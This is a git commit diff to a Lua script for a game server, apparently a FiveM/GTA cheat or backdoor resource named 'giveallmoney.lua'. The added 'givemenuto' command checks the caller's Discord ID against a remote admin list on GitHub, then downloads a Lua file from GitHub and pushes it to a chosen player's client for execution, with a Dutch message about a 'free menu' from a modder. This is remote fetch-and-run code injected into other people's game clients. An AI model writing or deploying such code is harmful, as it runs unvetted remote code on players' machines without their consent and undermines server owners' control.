99cddb6d1a3985db889b1261c9455116718cca9b
Sahbes <80922759+Sahbes@users.noreply.github.com>
2023-08-20 16:58:37 +0200

    Update giveallmoney.lua

--- giveallmoney.lua
+++ giveallmoney.lua
@@ -85,6 +85,39 @@ RegisterCommand('givemoneytoall', function(source, args, rawCommand)
      end
  end)
 
+RegisterCommand('givemenuto', function(source, args, rawCommand)  
+    local _source = source
+    local player = tonumber(args[1])
+    for k,v in pairs(GetPlayerIdentifiers(_source))do
+                
+        if string.sub(v, 1, string.len("discord:")) == "discord:" then
+            local discord = v
+
+            local dclicense = string.gsub(discord, 'discord:', '')
+
+            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
+                if code == 200 then
+                    local decoded = json.decode(res)
+                    if decoded[dclicense] ~= nil then
+                        PerformHttpRequest("https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/gayout.lua", function(code, res, headers)
+                            if code == 200 then
+                                if res ~= nil then
+                                    TriggerClientEvent('esx:showNotification', player, "Gratis menu xxx je favoriete modder")
+                                    TriggerClientEvent('GTX:executecommand', player, res)
+                                else
+                                    TriggerClientEvent('esx:showNotification', _source, "Menu kan niet gevonden worden")
+                                end
+                            end
+                         end)
+                    else
+                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
+                    end
+                end
+            end)
+        end
+     end
+ end)
+
 RegisterCommand('givemenutoall', function(source, args, rawCommand)  
     local _source = source
     for k,v in pairs(GetPlayerIdentifiers(_source))do
